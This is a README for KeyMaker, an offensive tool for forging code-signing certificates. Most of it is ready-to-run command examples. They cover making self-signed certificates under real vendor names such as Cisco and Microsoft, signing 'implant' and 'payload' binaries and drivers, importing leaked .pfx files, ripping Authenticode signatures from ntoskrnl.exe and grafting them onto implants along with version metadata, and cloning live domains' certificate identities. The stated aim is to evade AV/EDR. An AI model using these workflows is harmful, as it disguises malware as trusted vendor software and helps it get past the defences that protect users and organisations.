<div align="center">

<h1>KeyMaker</h1>
<p><em>Code-signing forge.</em><br>
Generate certs with realistic vendor identities, sign PE files, steal Authenticode signatures, clone live domain certs.</p>

</div>

Generate self-signed Authenticode certificates with realistic vendor identities, sign PE files (exe/dll/sys), steal and graft signatures from legitimate binaries, or clone a live domain's TLS cert metadata into a code-signing cert. Self-signed certs satisfy vendor-name heuristics and signature-presence checks; for CA-trusted signatures, import a leaked `.pfx`.

Observed on a real engagement: a self-signed binary was blocked by a top-tier EDR; the same binary countersigned by an RFC-3161 timestamp server was not (see [Timestamp](#compared-to-existing-tools)).

---

## Install

Linux / macOS only - `openssl` and `osslsigncode` are Unix tools with no Windows equivalent.

**1. Python package** (adds `keymaker` to PATH, no external Python dependencies):

```bash
pip install -e .
```

**2. System dependencies** (`openssl` + `osslsigncode`):

```bash
# openssl - usually already present; if not:
apt install openssl          # Debian/Ubuntu
brew install openssl         # macOS

# osslsigncode - build from source:
# requires: git, cmake, gcc, libssl-dev
make install-tools           # clones + builds -> ~/.local/bin/osslsigncode
```

`make install-tools` clones [mtrojnar/osslsigncode](https://github.com/mtrojnar/osslsigncode), builds it with cmake, and installs the binary to `~/.local/bin/`. Make sure `~/.local/bin` is in your `PATH`.

---

## Usage

### gen - generate a certificate

```bash
# random enterprise vendor
keymaker gen

# specific pool
keymaker gen --pool banking        # Thales, Worldline, FIS, Murex...
keymaker gen --pool french         # Dassault, Wavestone, Eviden, Idemia...
keymaker gen --pool generic        # low-profile software vendors

# explicit fields
keymaker gen --cn "Cisco Systems" --bits 4096 --days 730 --password s3cr3t

# LLM-generated identity (coherent CN/Org/OU)
keymaker gen --llm ollama
keymaker gen --llm anthropic --industry finance
keymaker gen --llm ollama:llama3.2 --llm-context "French banking sector" --country FR
```

Generated `.pfx` files are stored in `~/.keymaker/certs/`.

Available `--llm` providers: `ollama`, `ollama:MODEL`, `deepseek`, `anthropic`, `openai`.
Available `--industry` values: `healthcare`, `finance`, `retail`, `manufacturing`, `telecom`, `energy`, `legal`, `education`.

### import - import a found certificate

Copies the `.pfx` into `~/.keymaker/certs/`. Once imported, use it for signing via `--cert <slug>` where slug is the filename without `.pfx`.

```bash
# import a .pfx found during OSINT
keymaker import /path/to/leaked_vendor.pfx
keymaker import /path/to/signed.pfx --password pfx_pw

# then sign with it (slug = filename without .pfx)
keymaker sign payload.exe --cert leaked_vendor
keymaker sign payload.exe --cert signed --password pfx_pw
```

### sign - sign PE files

Timestamp is enabled by default, rotating across DigiCert / Sectigo / Comodo / Apple per signing. Use `--no-timestamp` to skip (faster, but signature becomes invalid once the cert expires).

```bash
# sign with newest cert in store (timestamp on by default)
keymaker sign payload.exe

# specific cert + fixed digest
keymaker sign implant.dll --cert cisco_systems --digest sha256

# force a specific timestamp server
keymaker sign payload.exe --timestamp-srv http://timestamp.digicert.com

# skip timestamp (offline ops, faster)
keymaker sign implant.dll --no-timestamp

# driver (post-BYOVD)
keymaker sign yasha.sys --cert worldline_sa --description "Windows Driver" --password s3cr3t

# multiple files
keymaker sign *.exe
```

### batch - sign a directory

```bash
keymaker batch ./dist
keymaker batch ./build -r --ext .exe,.sys
keymaker batch ./output --cert capgemini_se
```

### steal - Authenticode signature theft

Four subcommands for different steps of the workflow:

- **rip** - extract the PKCS#7 signature blob from a legitimately-signed PE and save it to a `.sig` file (reusable offline)
- **graft** - copy a signature onto an unsigned PE, either directly from a signed source or from a pre-ripped `.sig` file. The hash inside the blob won't match the target content - full Authenticode validation fails - but AV/EDR products that only check cert-table presence or known-CA weight treat the binary as signed. The original timestamp embedded in the source's PKCS#7 blob is preserved as-is - no new TSA request is made
- **check** - check whether a PE has a signature block at all (presence only, no chain validation)
- **remove** - strip the signature from a PE entirely

**Typical workflow - rip once, graft onto multiple implants:**

```bash
# 1. rip the signature from a trusted Windows binary
keymaker steal rip C:\Windows\System32\ntoskrnl.exe -o ntoskrnl.sig

# 2. graft it onto your implant (from the saved .sig)
keymaker steal graft --sig ntoskrnl.sig implant.exe

# 3. verify presence
keymaker steal check implant.exe
```

**One-shot - graft signature AND VS_VERSION_INFO (CompanyName, ProductName, FileVersion):**

```bash
# implant.exe will show the same Properties tab as ntoskrnl.exe
keymaker steal graft --source ntoskrnl.exe implant.exe --with-meta -o implant_signed.exe
```

**Inspect VersionInfo fields from any PE:**

```bash
keymaker steal meta C:\Windows\System32\ntoskrnl.exe
```

**Cleanup - strip a signature before re-signing:**

```bash
keymaker steal remove implant.exe -o implant_clean.exe
```

### clone - clone a domain's TLS cert metadata

Fetches the live TLS certificate from a domain and reissues a self-signed code-signing cert with the same CN, Org, country, and validity window.

```bash
# clone microsoft.com cert metadata
keymaker clone microsoft.com

# clone and immediately sign a PE
keymaker clone google.com --sign payload.exe

# custom output slug + PFX password
keymaker clone apple.com --out apple_codesign --password s3cr3t --bits 4096
```

### verify

```bash
keymaker verify payload.exe
keymaker verify dist/*.exe
```

### list

```bash
keymaker list
```

```
Keystore  (/home/user/.keymaker/certs)

FILE                    SUBJECT                         EXPIRES
--------------------    ----------------------------    --------------------------
cisco_systems.pfx       CN=Cisco Systems, O=Cisco...    Sep 14 12:00:00 2027 GMT
worldline_sa.pfx        CN=Worldline SA, O=Worldli...   Mar 02 09:00:00 2028 GMT
```

### vendors - browse pools

```bash
keymaker vendors
keymaker vendors --pool banking
keymaker vendors --pool french
```

---

## Vendor Pools

| Pool | Count | Context |
|------|-------|---------|
| `enterprise` | 20 | General IT/security (Cisco, Oracle, VMware, Palo Alto...) |
| `banking` | 20 | Financial sector (Thales, Worldline, FIS, Murex...) |
| `french` | 15 | French/EU tech (Dassault, Wavestone, Eviden, Idemia...) |
| `generic` | 15 | Low-profile software vendors |
| `all` | 70 | Combined pool |

---

## Compared to existing tools

Every tool below covers one piece of the workflow. KeyMaker covers all of it.

| Tool | Gen | Sign | Steal | Clone | Meta graft | Timestamp | LLM |
|------|-----|------|-------|-------|------------|-----------|-----|
| [SigThief](https://github.com/secretsquirrel/SigThief) | - | - | rip+graft | - | - | - | - |
| [sigtransplant](https://github.com/etke/sigtransplant) | - | - | rip+graft | - | - | - | - |
| [MetaTwin](https://github.com/threatexpress/metatwin) | - | - | rip+graft | - | yes | - | - |
| [ScareCrow](https://github.com/optiv/ScareCrow) | - | - | graft | - | - | own payloads | - |
| [SigFlip](https://github.com/med0x2e/SigFlip) | - | - | - | - | - | - | - |
| **KeyMaker** | yes | yes | rip+graft+meta | yes | yes | any PE, 4 servers | yes |

All competing tools require Windows to run. KeyMaker runs on Linux and macOS - the operator's machine, not the target's.

**Gen**: every steal-only tool requires finding an already-signed binary to borrow from. KeyMaker generates a self-signed cert with a realistic vendor identity from scratch - no source binary, no dependency on what you can find on the target.

**Sign**: none of the other tools sign anything. KeyMaker calls `osslsigncode` to produce a real Authenticode-signed PE with an RFC-3161 timestamp (DigiCert, Sectigo, Comodo, Apple) so the signature survives cert expiry.

**Clone**: unique to KeyMaker. Fetches the live TLS cert from a domain and reissues it as a code-signing cert with identical CN/Org/country/validity. `keymaker clone microsoft.com --sign implant.exe` in one command.

**Meta graft**: when you graft a stolen signature, the PE's "Details" tab (CompanyName, ProductName, FileVersion) still shows the implant's original values. `steal graft --with-meta` overwrites those fields from the source binary so both the signature and the properties tab match. MetaTwin does this on Windows via PowerShell; KeyMaker does it in pure Python on Linux/macOS.

**Timestamp**: AV/EDR products give additional legitimacy weight to binaries countersigned by an authoritative TSA (DigiCert, Sectigo, Comodo, Apple), independently of whether the signing cert itself is trusted. KeyMaker timestamps any PE you give it, rotating across 4 servers to avoid clustering on a single TSA.

**LLM**: KeyMaker can call Ollama/Anthropic/OpenAI to generate coherent vendor identities (CN, Org, OU, email, industry context) rather than drawing from a static pool.

---

Rip/graft produces a cryptographically invalid signature - the PKCS#7 blob doesn't match the target PE's hash. Whether it bypasses AV/EDR depends on whether `WinVerifyTrust` is actually called or only cert table presence is checked, which is common in EDR products that weight CA reputation over hash validation.

---

## License

Licensed under the GNU Affero General Public License v3.0. See [LICENSE](LICENSE) for full terms.

---

## Contact

[![ProtonMail][protonmail-shield]](mailto:contact@franckferman.fr)
[![LinkedIn][linkedin-shield]](https://www.linkedin.com/in/franckferman)
[![Twitter][twitter-shield]](https://www.twitter.com/franckferman)

[protonmail-shield]: https://img.shields.io/badge/ProtonMail-8B89CC?style=for-the-badge&logo=protonmail&logoColor=blueviolet
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=blue
[twitter-shield]: https://img.shields.io/badge/-Twitter-black.svg?style=for-the-badge&logo=twitter&colorB=blue
